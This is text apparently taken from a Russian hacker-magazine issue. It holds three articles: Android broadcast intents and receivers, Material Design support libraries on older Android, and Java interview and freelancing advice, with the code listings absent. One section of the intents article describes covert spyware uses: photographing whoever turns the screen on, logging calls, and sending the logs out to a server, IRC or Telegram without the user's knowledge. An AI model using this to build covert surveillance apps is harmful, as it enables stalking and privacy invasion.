Одна из замечательных особенностей интентов заключается в том, что это
именно сообщения, а значит, их можно использовать не только для запуска
компонентов приложений, но и для оповещения о каких-либо событиях и пере-
дачи данных. И эта их особенность используется в Android на полную катушку.
Система рассылает широковещательные сообщения при возникновении лю-
бого сколько-нибудь значимого события: включение и выключение системы,
включение экрана, подключение к сети, подключение к заряднику, низкий за-
ряд батареи, входящий и исходящий звонки и многое другое. Даже смена даты
приводит к посылке широковещательного сообщения.
   Если писать код с учетом всех этих сообщений, можно получить очень умное
приложение, способное подстраиваться под работу смартфона и пользовате-
ля, а что самое важное — приложение будет обрабатывать эти сообщения вне
зависимости от того, запущено оно или нет (точнее, система запустит прило-
жение, когда придет сообщение).
  В качестве примера приведу ситуацию «из жизни». У меня есть приложение
с полностью зависимым от наличия интернета сервисом. Сервис постоянно
поддерживает подключение к удаленному серверу и ждет команды управления.
Обычными методами проблема внезапного отключения от интернета реша-
лась бы либо проверкой на наличие интернета перед каждым переподключе-
нием к серверу и засыпанием, если его нет, либо отдельным потоком, который
бы время от времени просыпался и чекал подключение к интернету, в случае
чего пиная основной поток. Недостаток обоих методов в том, что они приводят
к задержкам переподключения в момент, когда интернет появляется. Ничего
критичного, конечно, но неприятно, да и довольно костыльно-велосипедно.
   Но, если приложение будет реагировать на сообщения от системы, эта про-
блема решится сама собой. Для реализации этого необходимо, чтобы прило-
жение реагировало на сообщение CONNECTIVITY_CHANGE, а затем проверяло,
что конкретно произошло: отключение от сети или подключение. Чтобы такое
реализовать, нам понадобится ресивер. Для начала объявим его в манифесте,
указав нужное сообщение в intent-filter:





Далее создадим сам ресивер filters/ConnChangeReceiver.java:
Ну и добавим в класс NetTools статический метод isConnected():





Я даже не стал добавлять комментарии, тут и так все понятно: при возникнове-
нии сообщения CONNECTIVITY_CHANGE запускается ресивер, который прове-
ряет, что произошло, коннект или дисконнект, и в зависимости от этого запу-
скает или останавливает весь сервис целиком. В реальном коде есть еще куча
других проверок, а также чекинг подключения с помощью пинга хоста 8.8.8.8
(подключение может быть установлено, но сам интернет недоступен), но это не
так важно, а важно то, что простейший код позволяет нам легко избавиться от
довольно серьезной проблемы, причем система по максимуму берет работу
на себя, и, например, если сервис уже будет запущен к моменту его запуска,
ничего не произойдет, второго сервиса не появится. Красота!
   Таким же образом я могу запустить свой сервис при загрузке:





Строки из манифеста приводить не буду, скажу лишь, что в intent-filter надо ука-
зать действие android.intent.action.BOOT_COMPLETED.
   Естественно, таким же образом можно реагировать на многие другие сооб-
щения, описанные в официальной документации.





Куча ресиверов в одном приложении


ПРИМЕР В СТИЛЕ ][
Конечно же, все эти сообщения можно использовать и в не совсем легальных
целях. Многочисленные системные сообщения позволяют реализовать до-
вольно хитрые схемы, например фотографирование включившего экран че-
ловека (действие android.intent.action.ACTION_SCREEN_ON), логирование
звонков (NEW_OUTGOING_CALL и PHONE_STATE), логирование общего времени
использования смартфона, да и вообще организовать полную слежку за дей-
ствиями его пользователя. Плюс использовать возможности выполнить звонок
или послать СМС без ведома пользователя.
  В качестве примера приведу логирование звонков. Для этого понадобится
довольно простой ресивер:
Как обычно, все элементарно, однако в этом случае ты можешь заметить,
что мы не просто реагируем на интент, но и проверяем действие с помощью
метода getAction() (наш ресивер должен реагировать и на действие NEW_
OUTGOING_CALL, и на PHONE_STATE, то есть изменение состояния радиомоду-
ля), а также проверяем переданные в интенте дополнительные данные с помо-
щью getStringExtra(). А далее, если это исходящий звонок, просто логируем
его, если же просто изменение состояния, то проверяем текущее состояние
с помощью TelephonyManager и логируем, если звонок входящий.
   Разумеется, в реальном приложении тебе надо будет не логировать звон-
ки, а либо аккуратненько записывать их в файлик, который затем отправлять
куда надо, либо сразу отправлять куда надо, хоть на сервер, хоть в IRC, хоть
в Telegram.
ВЫВОДЫ
Теперь тебе должно быть предельно ясно, как работает Tasker. Все, что он де-
лает, — это реагирует на широковещательные сообщения и в ответ отправляет
другие сообщения (с помощью которых запускает софт или переключает те или
иные настройки Android). Да, это опасная штука, с помощью которой написать
шпиона, знающего о тебе все, проще простого, но в то же время и невероятно
полезная для любого разработчика технология.
   Тот же Google Now, например, умеет из коробки интегрироваться с любы-
ми сторонними будильниками, мессенджерами и почтовыми клиентами имен-
но потому, что использует Binder и стандартные действия типа ACTION_SEND.
Точно так же любой разработчик может легко реализовать в своем приложении
возможность сделать снимок камерой, выбрать файлы или отправить письмо,
просто посылая нужные сообщения, которые будут обработаны стоковыми или
другими приложениями, вне зависимости от того, какие из них предпочитает
использовать юзер.
КОДИНГ
MATERIAL DESIGN
В ANDROID
ПРОДОЛЖАЕМ
ИЗУЧАТЬ МОДНУЮ ТЕМУ.
ГОТОВЬСЯ, ЭТО
БУДЕТ ЛОНГРИД!





                                                                                 Сергей Мельников
                                                                                                            mail@s-melnikov.net,
                                                                                                         www.s-melnikov.net
Android-роботы версий 5 и 6 продолжают гордо ша-
гать по смартфонам и планшетам радостных пользо-
вателей, сверкая красотами Material Design. При этом,
надо отдать должное Google, старые девайсы никто
не забывал, они тоже примерили шкурки материаль-
ного дизайна, пусть и не в полном объеме. О том, как
все это работает на устройствах с Android версий со
второй по четвертую, мы сегодня и поговорим. Если
же ты разрабатываешь приложения исключитель-
но для Android 6, то информация, приведенная ниже,
тоже будет тебе полезна.

МОДНЫЙ ПРИГОВОР
Material Design — дизайн программного
обеспечения и приложений операцион-
ной системы Android от компании Google,
впервые представленный на конферен-
ции Google I/O в 2014 году. Идея дизай-
на заключается в создании приложений,
которые открываются и сворачиваются
как физические (то есть материальные)
карточки. Как и все физические объекты,
они должны отбрасывать тень и иметь не-
которую инерционность. По идее дизай-
неров Google, у приложений не должно
быть острых углов, карточки должны пе-
реключаться между собой плавно и прак-
тически незаметно (рис. 1).
   Вообще, эффект тени позволяет визу-
ально расположить все элементы на раз-
ной высоте, то есть получается некоторая
совокупность слоев (рис. 2).
  Не менее значима концепция плаваю-
щей кнопки (Floating Action Button), отра-
жающей главное действие во фрагменте
или активности. Например, в Gmail дан-
ный виджет позволяет создать новое   Рис. 1. Основные элементы Material Design
письмо. Плавающей эта кнопка названа потому, что ее положение не фиксиро-
вано (да, не только правый нижний угол) и может меняться. Причем это измене-
ние должно быть плавно и осмысленно анимировано, то есть, например, при
скроллинге компонента ListView или переключении фрагмента FAB кнопка мо-
жет «уезжать» за экран или «растворяться».





Рис. 2. Слои? Слои!

Формат журнальной статьи не позволяет описать все нюансы Material Design
(в пересчете на бумажный формат ты нафигачил целых полторы статьи :). —
Прим.ред.), тем более что не все из них можно реализовать библиотеками со-
вместимости в преLollipop версиях Андроида. Наиболее тяжело в этом плане
дела обстоят с анимацией. Например, у нас не получится увидеть Ripple-эф-
фект (расходящиеся круги при нажатии на кнопку), так как данная анимация ре-
ализуется аппаратно и недоступна для старых устройств. Разумеется, это ре-
шается сторонними библиотеками, но об этом мы поговорим в следующий раз.
   Ознакомиться с гайдами по Material Design можно (даже нужно!) на офици-
альном сайте Google, а по адресу доступен перевод на русский язык.

ANDROID APPCOMPAT VS. DESIGN SUPPORT LIBRARY
После выхода в свет Android 5 в SDK от Google произошло существенное об-
новление библиотеки AppCompat (в девичестве ActionBarCompat), получившее
седьмую версию aka v7. Самой вкусной в этой версии стала возможность ис-
пользования элементов Material Design в ранних версиях Андроида — начиная
с 2.1 (API Level 7). Один из таких элементов — виджет Toolbar, пришедший на
замену скучному ActionBar — панели, расположенной в верхней части актив-
ности (той самой, где висит «гамбургер», открывающий боковое меню). Кроме
того, новое Material-оформление коснулось и других стандартных элементов:
EditText, Spinner, CheckBox, RadioButton, Switch, CheckedTextView.
  Помимо этого, были добавлены новые библиотеки — RecyclerView (крутей-
шая замена ListView), CardView (карточка) и Palette (динамическая палитра).
К слову, в декабрьском Хакере эти элементы уже были рассмотрены — срочно
ищи и изучай, повторяться не будем.
   Казалось бы, мы у цели, вот оно — счастье, но, взглянув, например, на по-
чтовый клиент Gmail в том же Android 4, потихоньку начинаешь понимать, что
с одной лишь AppCompat такое приложение не накодишь. Ведь по какой-то
космической причине в библиотеке AppCompat нет даже плавающей кнопки —
едва ли не главного элемента Material Design.
  К счастью, в Google рассуждали точно так же, но, правда, почему-то не стали
дополнять AppCompat, а представили совершенно новую библиотеку совме-
стимости — Design Support Library. Здесь уже все по-взрослому: удобное бо-
ковое меню (Navigation View), плавающая кнопка (Floating Action Button), всплы-
вающее сообщение (Snackbar), анимационный Toolbar и многое другое. Далее
мы зарядим все библиотеки в обойму знаний и познакомимся поближе с этими
прекрасными нововведениями.
   Хочу только заметить, что библиотеки и виджеты можно использовать как по
отдельности, так и все вместе.
   Итак, обновляем SDK, запускаем Android Studio и начинаем кодить...

ИМПОРТ БИБЛИОТЕК
Так как мы используем Android Studio, импорт модулей необходимо выполнять
в секции dependencies файла build.gradle проекта:





На момент выхода журнала уже будет доступна версия библиотек под номером
23.1.1, но для нас это не принципиально. Кстати, IDE любезно подскажет номер
последней версии, а также автоматически скачает ее из репозитория, если она
отсутствует.
COORDINATORLAYOUT, TOOLBAR И ВСЕ-ВСЕ-ВСЕ
Начнем с весьма эффектного компонента — CoordinatorLayout, позволяюще-
го связывать (координировать) виджеты, помещенные в него (по сути,
CoordinatorLayout является продвинутым FrameLayout). Чтобы было понятно,
на рис. 3 приведено исходное состояние фрагмента приложения. Стоит толь-
ко начать перелистывать список, как размер заголовка плавно вернется к тра-
диционному размеру (уменьшится), освобождая место для полезной инфор-
мации (рис. 4). И это все, что называется, прямо из коробки, без всяких
костылей.





Рис. 3. Было                                 Рис. 4. Стало
Разметка фрагмента приведена ниже (несмотря на размер, код достаточно
тривиален):
Видно, что у CoordinatorLayout два дочерних элемента: AppBarLayout и контей-
нер FrameLayout. Последний может содержать любые прокручиваемые эле-
менты интерфейса: например, RecyclerView или ListView. В приведенном на
рис. 3 приложении в этом контейнере находятся RecyclerView и кнопка (FAB).
Теперь AppBarLayout и FrameLayout будут зависеть друг от друга при скрол-
линге, но только в том случае, если у последнего указать специальный флаг
layout_behavior=»@string/appbar_scrolling_view_behavior»,  который
инициирует передачу прикосновений в AppBarLayout.
   Идеологически  AppBarLayout  в  чем-то  напоминает  вертикальный
LinearLayout, элементы которого могут вести себя по-разному (в зависимо-
сти от флагов) при прокручивании содержимого. В приведенном примере ис-
пользуется виджет CollapsingToolbarLayout, являющийся удобной оберткой для
компонента Toolbar. Собственно, CollapsingToolbarLayout специально спроек-
тирован для использования внутри AppBarLayout. Размер самого AppBarLayout
в развернутом виде определяется параметром layout_height, и в листинге он
равен 192dp.
   Флаг layout_scrollFlags определяет поведение компонента при про-
кручивании. Если не указать scroll, AppBarLayout останется на месте, а контент
уплывет (забавный эффект). Второй флаг, exitUntilCollapsed, определяет,
как именно будет прокручиваться Toolbar и остальной контент. К сожалению,
описывать на словах отличие флагов друг от друга бесполезно, поэтому отсы-
лаю тебя по адресу, где наглядно (с анимацией) расписаны все варианты. Как
говорится, лучше один раз увидеть...
   Параметр contentScrim=»?attr/colorPrimary» задает цвет фона, в кото-
рый переходит фоновое изображение при свертывании CollapsingToolbarLayout.
Внимательный читатель заметит, что на рис. 4 Toolbar вовсе не окрашен в ка-
кой-либо цвет, а немного затененное изображение осталось на месте. Чтобы
получить такой эффект, нужно указать константу @android:color/transparent.
   Наконец, виджеты, непосредственно определяющие внешний вид фрагмента
(активности), — Toolbar («гамбургер», заголовок, кнопки меню) и ImageView (фон)
завернуты в CollapsingToolbarLayout. Флаг layout_collapseMode=»parallax»
у ImageView обеспечивает плавное затенение фонового изображения при сво-
рачивании Toolbar’a. По опыту использования могу сказать, что «параллакс»
работает не на всех устройствах.
  Все вышесказанное может показаться сложным и неочевидным, но огром-
ный плюс данного подхода в том, что вся логика совместной работы виджетов
определена в файле разметки, а не в коде. Кстати, о последнем:





Вот, собственно, и весь код! SetSupportActionBar переключает ActionBar на
Toolbar с сохранением почти всех свойств и методов первого. В частности, уста-
навливается заголовок с помощью setTitle. Полное описание виджета Toolbar
доступно на официальном сайте Android Developers.
   Далее находим ImageView фона и с помощью сторонней библиотеки
Picasso устанавливаем соответствующее изображение. Обычно я не склонен
к критике Google, но тут не могу удержаться. Неужели за столько времени су-
ществования Android нельзя было написать нормальную стандартную библи-
отеку для загрузки изображений? Чтобы метод setImageResource не вызывал
Out of Memory для изображений в нормальном разрешении? Гайдлайны при-
зывают делать яркие и стильные приложения со множеством графики, а такая
вещь, как загрузка картинки, реализована спустя рукава. Нет, конечно, мож-
но использовать BitmapFactory, придумывать кеширование, но это решение
так и просится в отдельную библиотеку, что, собственно, сделано и в Picasso,
и в UniversalImageLoader. Одним словом, непонятно...

SNACKBAR
Snackbar представляет собой неболь-
шое информационное  окно,  распо-
ложенное в нижней части активности
(рис. 5). Помимо информационного со-
общения, имеется небольшая плоская
кнопка (так называемый Action), позво-
ляющая взаимодействовать с пользо-
вателем (например, отменить удаление
сообщения). После тайм-аута Snackbar
автоматически закрывается (как и тра-   Рис. 5. Snackbar собственной персоной
диционный компонент Toast).
   Вызывается виджет совсем несложно:
Кстати, если в разметке не использовать рассмотренный выше CoordinatorLayout,
то при вызове Snackbar может получиться наложение виджетов (рис. 6). Так
происходит потому, что FAB ничего не знает ни о каком Snackbar и момент по-
явления на экране последнего не отслеживает. Если же применить иерархию
CoordinatorLayout, то все отображается корректно (рис. 7).





Рис. 6. CoordinatorLayout отдыхает





Рис. 7. CoordinatorLayout работает



       WWW
               Пример на GitHub, охватываю-
              щий все рассмотренные компо-
                ненты и виджеты





                                            Рис. 8. Джон Доу?

EDITTEXT FLOATING LABELS
В Material Design появилась новая «обертка» вокруг стандартного элемента
ввода текста EditText (рис. 8), расширяющая его функциональность. Текст под-
сказки (Hint) теперь не пропадает, а плавно перемещается вверх. Так, если на-
жать на поле «Комментарий» (см. рис. 8), текст уменьшится и займет свое по-
ложение аналогично верхнему полю. Код разметки данного элемента (паттерн
«Декоратор» во всей красе):
Кроме того, имеется возможность показать сообщение об ошибке в правой
части виджета. Реализуется это в коде следующим образом:





  NESTED TOOLBAR
   Помимо рассмотренных в декабрьском Хакере карточек (CardView), су-
   ществует также Card Toolbar (или Nested Toolbar), то есть карточка, пе-
   рекрывающая часть Toolbar’а. На рис. 8 приведена именно такая кар-
    точка. По ссылке доступен пример использования.
Сообщение об ошибке также можно показать непосредственно под строкой
ввода (рис. 9):





Рис. 9. Вывод ошибки с помощью
TextInputLayout





                                            Рис. 10. Пример Navigation Drawer

NAVIGATION DRAWER
Navigation Drawer — панель с элементами меню приложения, которая выдвига-
ется при нажатии на «гамбургер» или по свайпу влево (рис. 10). Панель состоит
из двух элементов: заголовка, где обычно располагается фоновое изображе-
ние, текущий аккаунт с аватаром и тому подобное, и собственно самого меню.
   Разметка активности, содержащей Navigation Drawer, должна удовлетворять
шаблону
DrawerLayout должен быть корневым элементом в иерархии разметки и вклю-
чать в себя, помимо элементов GUI (Toolbar, фрагменты и так далее), вид-
жет NavigationView. У последнего имеются два важных свойства: headerLayout
и menu. Первый, необязательный, определяет файл разметки заголовка (в пап-
ке layout), второй, очевидно, — самого меню (в папке menu).
   Заголовок может быть каким угодно (в рамках здравого смысла и гайдов
Google, разумеется). Например, для простого текста на фоне с цветом
colorPrimaryDark (ты же читал предыдущую статью?):
Формат разметки меню стандартен:





В  приведенном  листинге  задаются  два  пункта  меню,  и  только  один
из  них  может  быть  активным  (подсвечивается),  за  что  отвечает  флаг
checkableBehavior=»single». Дополнительно создаются два элемента подме-
ню, отделенные от основного меню заголовком title=»@string/nav_sub_menu».
  В код приложения нужно добавить лишь пару (хорошо, немного больше) строк:
и переопределить метод onOptionsItemSelected, чтобы при нажатии на «гам-
бургер» открывалось именно боковое меню:





Осталось только написать обработчик элементов меню:





Здесь находим наш NavigationView и вешаем на него новый обработчик
onNavigationItemSelected, который, во-первых, устанавливает текущий элемент
меню setChecked(true); во-вторых, закрывает Navigation Drawer; в-третьих,
делает все остальное, то есть выводит на экран сообщение (Toast).
SWIPEREFRESHLAYOUT,
ИЛИ «ПОТЯНИТЕ,
ЧТОБЫ ОБНОВИТЬ...»
За бортом остался простой, но очень
популярный виджет — SwipeRefresh-
Layout. Он бывает нужен, когда в при-
ложении есть обновляемая информа-
ция и пользователь, потянув контент
жестом вниз, а потом отпустив, мо-
жет ее  актуализировать. Работать
с ним очень просто, вот подробный    Рис. 12. Потянем?
пример.



TABLAYOUT
Под занавес рассмотрим прокачанную версию вкладок (Tabs). Вернемся к раз-
метке раздела CoordinatorLayout и после Toolbar’а добавим два виджета:





Всю работу будет выполнять TabLayout, а старенький ViewPager нужен для того,
чтобы получить горизонтальную прокрутку между вкладками (рис. 11).
                                                                  Рис. 11. Три вкладки





В методе onCreate, как всегда, находим виджеты и настраиваем вкладки:





Для работы с вкладками необходим адаптер, который будет хранить информа-
цию обо всех Tab’ах. Каждая вкладка представляет собой фрагмент и содержит
в разметке только текстовую метку (TextView) — «один», «два» или «три».
В приведенном адаптере содержатся два списка — mFragmentList, для хране-
ния фрагментов вкладок, и  mFragmentTitleList, для хранения заголовков
TabLayout. В нашем простом случае все фрагменты одинаковы, а значит, класс
TabFragment тоже один:
NewInstance возвращает новый экземпляр фрагмента (так называемый фа-
бричный метод) и сохраняет в качестве аргумента (putString) переданный заго-
ловок вкладки (title). В onCreateView этот заголовок извлекается и отображает-
ся на текстовой метке.

УГОЛОК СКЕПТИКА
Material Design, безусловно, хорошая попытка систематизировать элементы дизай-
на и их поведение в GUI. Если разработчики будут следовать гайдлайнам Google,
количество вырвиглазных приложений, вероятно, снизится. И это хорошо...
  С другой стороны, не появится ли слишком много одинаковых приложений?
На том же Droidcon в 2015 году в докладе, посвященном Material Design, были
представлены в качестве примеров того, как не стоит делать, несколько плат-
ных приложений, точь-в-точь повторяющих примеры из SDK. Google не устает
напоминать, что гайдлайны носят рекомендательный характер, но стоит только
взглянуть хотя бы на одну такую «рекомендацию» (рис. 13), как становится как-
то неуютно, если сделать отступ не 8 dp, а 10 dp. Почему, собственно, 8 dp?
Откуда взялось это число? Сетка? Почему не, допустим, 16 dp?
  Еще вопрос: если Action всего один, где его располагать? Слева? По центру?
Одним словом, гайдлайны гайдлайнам рознь, но иметь свой взгляд на Material
Design как в прямом, так и в переносном смысле лишним точно не будет.

                                                                  Рис. 13. Простор для
                                                            фантазии?
ВЫВОДЫ
Как видишь, работать с новыми виджетами на старых Андроидах можно, и даже
без велосипедов, мотыг и костылей. Очень приятно, что Google не (совсем) за-
бывает о своем наследии. Так что, если ты разрабатываешь новое приложение,
Material Design — лучший выбор, а вот вопрос о целесообразности тотальной
переделки интерфейса уже имеющихся (читай: отлаженных) Holo-приложений
в Material пока остается открытым. Как всегда, время покажет...
КОДИНГ





                                          gogaworm
                                                gogaworm@tut.by
  ЗАДАЧИ
     НА СОБЕСЕДОВАНИЯХ


                      С П Е Ц В Ы П У С К
           СТАНЬ БОГАТЫМ
        JAVA-ПРОГРАММИСТОМ!
Java-программисты на протяжении нескольких лет
остаются самыми востребованными специалиста-
ми на рынке IT. Они получают зарплату, привязанную
к курсу доллара, и не испытывают дискомфорта от
экономических кризисов. Невзирая на все мрачные
предсказания, проектов, связанных с Java-техноло-
гиями, становится все больше. Профессиональные
Java-специалисты ценятся по всему миру. Независи-
мо от их страны проживания работодатели соглас-
ны вкладывать в них деньги. Если ты задумываешься
о карьере Java-разработчика, то эта статья для тебя.
В ней собраны практические советы по подготов-
ке и прохождению собеседования, поиску работы
в офисе и удаленно.


  РЕЗЮМЕ
    Составляя резюме, старайся выделить знание именно тех техноло-
     гий, которые требуются в вакансии. Описывая проекты, в которых ты
    принимал участие, не забудь указать свои обязанности и задачи в рам-
     ках проекта, не только связанные с написанием кода, но и бета-тести-
    рование, unit-тесты, билд-скрипты, настройку сервера приложения,
     Jenkins’а или создание базы данных. Имей в виду, что тебе придется
     ответить за каждую технологию, которую ты указываешь в резюме, так
     что не стоит вписывать то, что ты совершенно не знаешь.



ПОДГОТОВКА К СОБЕСЕДОВАНИЮ
Теперь займемся подготовкой к самому собеседованию. Независимо от про-
екта и используемых фреймворков для начала нужно показать твердые знания
Core Java. По Java существует множество всевозможных пособий и обучающих
курсов, но лучшим пособием будет литература для подготовки к сдаче экзаме-
на на сертифицированного программиста Java от Oracle, например OCA OCP
Java SE 7 Programmer I & II Study Guide. Проверить знания на практике по-
может ресурс или более серьезный, но тут придется немного раскошелиться.
Как ни странно, может пригодиться YouTube. Неплохой курс на русском языке
выложен на канале Golovach Courses. В понятной и доступной форме объясня-
ются Java Core, JDBC, JEE и многое другое, также есть видео, посвященные
прохождению собеседования. Неплохие ролики, освещающие самые популяр-
ные вопросы на собеседовании Java-программиста, выкладывает Александр
Будников с пометкой IT Sphere Channel.
   Если ты хочешь быть востребованным специалистом и получать хорошую
зарплату, без Java Enterprise не обойтись.
   Изучение Enterprise Java лучше начинать с азов — с понимания, как рабо-
тает сервлет и JSP. Тогда на многие вопросы ответ можно будет додумать ло-
гически, даже не зная его. Хорошая книга на эту тему — Head First Servlets
and JSP издательства O’Reilly. В ней подробно рассматриваются устройство
сервлетов и JSP-страниц, сессии, устройство веб-приложений, есть даже не-
большое введение в MVC и другие паттерны J2EE. В конце книги тебе будет
предложен небольшой экзамен, с помощью которого ты сможешь проверить
свежеполученные знания.
  Любой Java Enterprise разработчик должен знать Tomcat. Это самый про-
стой, самый легкий и, пожалуй, самый задокументированный сервер приложе-
ний. Tomcat нужно не просто уметь запускать и вырубать. Попробуй развернуть
веб-приложение, настроить удаленную отладку, разобраться с настройкой
производительности, SSL.
   Далее стоит изучать уже JBoss/WildFly — все-таки многие J2EE-техноло-
гии на томкате не работают. JBoss/WildFly бесплатный, вполне функциональ-
ный, и он частенько используется даже у серьезных заказчиков.
   Какое веб-приложение обходится без слоя данных? Правильно, почти ни-
какое, поэтому даже на проекты, использующие NoSQL-базы, не берут без хо-
рошего знания SQL. На SQL придется писать часто и много. Слишком глубоких
знаний от программиста Java, конечно, не ожидают, но JOIN’ы и методы нор-
мализации нужно знать назубок. Неплохая книжка по SQL — «Изучаем SQL»
Линн Бейли. Отличный интерактивный курс предлагает w3schools.
  Дальше нужно разобраться с JDBC. Казалось бы, зачем учить то, что уже
практически нигде в чистом виде не пользуется? Дело в том, что все ORM бази-
руются на старом добром JDBC, и рано или поздно при возникновении проблем
с БД с ним придется столкнуться. Кроме того, на собеседовании часто просят
обосновать выбор ORM или JDBC на практическом примере, поэтому нужно
осознавать все преимущества и недостатки первого и второго способов.
  Из ORM наибольшей популярностью пользуется Hibernate. Так что с прице-
лом на будущую карьеру я бы советовала тебе разобраться в нем хорошенько.
К счастью, Hibernate отлично документирован и снабжен кучей примеров на
любой вкус. Из книг обрати внимание на Java Persistence with Hibernate Кри-
стиана Байера.
  Из фреймворков по-прежнему лидирующие позиции (по предлагаемым ва-
кансиям) занимает Spring. Лучшая документация по Spring, на мой взгляд, нахо-
дится на официальном сайте. Там же тебя ждет множество примеров и разбор
всевозможных нюансов фреймворков. Из неплохих книг, тем более на русском,
советую «Spring 4 для профессионалов» Шефера, Хо и Харропа.
  В основном на собеседовании по Spring затрагивают такие темы, как назна-
чение фреймворка, задачи, которые он решает, простые вопросы по настрой-
ке, интеграция Spring с другими фреймворками, например Hibernate. Неплохо
бы иметь внятное представление о Dependency Injection / Inversion Of Control,
знать, что собой представляет container, что такое бины, жизненный цикл,
scopes, уметь работать как с XML-инициализацией, так и через аннотации, ра-
зобраться с валидацией, ресурсами и, конечно же, Spring MVC.



    Неплохо бы иметь внятное представление о Dependency Injection /
     Inversion Of Control, знать, что собой представляет container, что
    такое бины, жизненный цикл, scopes, уметь работать как с XML-
    инициализацией, так и через аннотации, разобраться с валидацией,
    ресурсами и, конечно же, Spring MVC



Не будут лишними и некоторые знания по работе веб-сервисов, понимание
REST и SOAP. Неплохая статья на эту тему есть на Хабре. Пригодятся также
знания по XML (без него совсем никуда в мире Enterprise), XPath и JSON.
   Ну и конечно, веб-приложения. А какое из них обходится без HTML, CSS
и JavaScript? Правильно, никакое. Знаний HTML достаточно на уровне курса от
w3schools, в CSS частенько приходится править мелкие ошибки, так что необ-
ходимо хотя бы представлять, что там где. Еще надо знать сам JavaScript. Хо-
рошо также уметь читать jQuery или AngularJS. А еще лучше — уметь его писать
(вижу, как при этих словах буйно радуются Игорь Антонов и Илья Русанен. —
Прим. ред.).
   Часто на собеседовании дают небольшие задачи на алгоритмы, подгото-
виться к ним помогут книги Седжвика «Алгоритмы на Java» и Лафоре «Струк-
туры данных и алгоритмы Java». Для оттачивания практических навыков ре-
комендую воспользоваться такими ресурсами, как Topcoder и Codeforces.
   Ну и конечно, жизненно необходимо знание английского. В смысле, не «тех-
нический», «со словарем», «читаю свободно», «читаю свободно, но ничего не
понимаю» :). С хорошим английским твои шансы найти хорошую работу воз-
растают в разы. Ты сможешь работать в международной команде, ездить в ко-
мандировки, читать ТЗ и другую техническую документацию от иностранных за-
казчиков, твоя ценность как специалиста значительно повышается.

СОБЕСЕДОВАНИЕ
Воспринимай собеседование не как экзамен, а скорее как дискуссию между
двумя специалистами. Не бойся задавать вопросы, спрашивать мнение собе-
седующего. Если попадается неизвестный вопрос, не паникуй. Если вопрос на
хорошую память, из разряда «как называется метод класса, который делает то-
то и то-то» или «перечислите все методы интерфейса такого-то», то можно сме-
ло отвечать, что IDEA (или другой любимый редактор) тебе всегда подсказыва-
ет. Если вопрос посложнее, например «как сделать составной ключ в Hibernet»,
а тебе не приходилось с этим сталкиваться, то скажи честно, что читал когда-то,
но не пригодилось, надо будет — нагуглишь и сделаешь. Показав готовность
найти ответ на любой вопрос, ты произведешь хорошее впечатление. Избегай
ответов «не знаю». Например, если тебя просят рассказать, как работает та или
иная библиотека, понимая, что она делает, можно попытаться представить, как
бы ты решил такую задачу на месте разработчиков. Просто покажи, что, даже не
зная ответа на конкретно этот вопрос, ты можешь додуматься до него логически.
  Одна из частей собеседования обычно посвящена выполненным проектам.
Лучше всего подготовиться к этой части заранее, вспомни самые яркие мо-
менты своей работы над проектом, решения, которыми ты гордишься или даже
которые оказались неудачными. Приготовься обосновать, почему для реали-
зации проекта были выбраны те или иные технологии, если технологии выби-
рал не ты, подумай, какой был бы твой выбор и почему.
   Если ты нацелился на конкретную компанию, сходи сначала на собеседова-
ния в другие компании со схожими требованиями. Так ты будешь чувствовать
себя более уверенно, узнаешь свои слабые места и примерные вопросы и за-
дачи, с которыми придется столкнуться.

ФРИЛАНС
Работа программиста хороша тем, что не обязательно вставать ранним утром,
тащиться в офис, стоять в пробках, толкаться в метро, общаться с такими же
милыми сонными людьми. Всегда можно работать дома, ну или на Канарских
островах, в общем — где захочется и когда захочется.
   Тут есть два варианта: фриланс и удаленная работа. Фриланс хорош тем,
что чаще всего ты работаешь в команде один — как хочешь, так код и пишешь,
где хочешь — рефакторишь и ни перед кем не отчитываешься.
  Из отрицательных черт фриланса — заработок нестабильный, и раз в не-
сколько месяцев приходится искать новые проекты (но зато ты сам можешь вы-
брать себе проект по душе).
   Другое дело — удаленная работа. Тут придется постараться и пройти на-
стоящее собеседование, правда, скорее всего, по скайпу или по телефону, но
и заработок она дает стабильный, потому что контракт, как правило, заключа-
ется на год и больше.
   Несмотря на обилие сайтов, предлагающих фриланс, найти там что-то стоя-
щее крайне сложно, а на зарубежных сайтах к тому же придется терпеть жуткую
конкуренцию с индусами и китайцами.
   Поэтому лучший способ найти проект — это сарафанное радио. Зареги-
стрируйся в соцсетях, распиши по максимуму свой опыт и укажи, что интере-
суешься работой на дому. Поделись со всеми друзьями своими планами. Не
помешает также написать в пару-тройку крупных компаний с предложением
своих услуг. Вакансий для удаленной работы у них, может, и не окажется, но
твоя анкета попадет в базу данных отдела кадров, а дальше тебя обязательно
попытаются кому-то выгодно продать.
  В подготовке к собеседованию уже следует делать основной упор на прак-
тику. Отвечая на технические вопросы, лучше упоминать, где и как ты сталки-
вался с подобным и как решал проблему в той или иной ситуации. Не было та-
кой задачи на практике? Расскажи, как решил поковыряться в свободное время
в этих классах или фреймворках и что для себя из этого извлек. Так как работать
ты будешь практически бесконтрольно, работодателю важно доказать, что ты
умеешь самостоятельно организовываться, решать задачи и развивать-
ся. Будь готов к тестовым заданиям. Но тут время работает на тебя. Сначала
тебе приходится доказывать заказчикам, что ты достоин их проектов, а через
несколько лет/проектов они уже будут выстраиваться в очередь.
   Конечно, абсолютно без опыта работы найти фриланс или удаленку прак-
тически нереально. Но у этой проблемы есть несколько вариантов решения.
Можно присоединиться к команде open source разработки. Там ты поучишь-
ся быстро вникать в чужой код, придерживаться стиля написания проекта, за-
ставлять себя работать. Можно попроситься в команду фрилансеров, ну или
сделать свой проект.
   Альтернативным вариантом приобретения опыта могут быть курсы про-
граммирования при больших компаниях (не путать с курсами программи-
рования от обучающих школ). Большинство крупных компаний понимают, что
в условиях нехватки специалистов самое простое — это выращивать их. Мно-
гие проводят курсы бесплатно, некоторые за деньги, но это инвестиции, кото-
рые в будущем окупаются. Хорошо зарекомендовав себя на таких курсах, ты
практически с 90%-й вероятностью трудоустроишься в эту компанию по окон-
чании. Если же что-то как-то не сложилось, то проекты, выполненные на курсах,
подойдут в качестве опыта работы для резюме. Старайся выходить за рамки
поставленной задачи, придумывай свои дополнения и улучшения программе,
которую нужно написать, обязательно пиши тесты, и твои старания не пройдут
даром. Впоследствии эти программы можно будет выложить в открытом досту-
пе, чтобы демонстрировать потенциальному работодателю.



   ПОИСК РАБОТОДАТЕЛЯ
    Для начала нужно определиться с потенциальным работодателем. На
    сегодняшний день в Сети есть множество ресурсов по поиску рабо-
     ты. Можно глянуть раздел с вакансиями на форумах программистов.
    Вакансий там меньше, но, как правило, они интереснее, хотя и спрос
    с кандидата будет больше. Ну и конечно же, друзья-программисты.
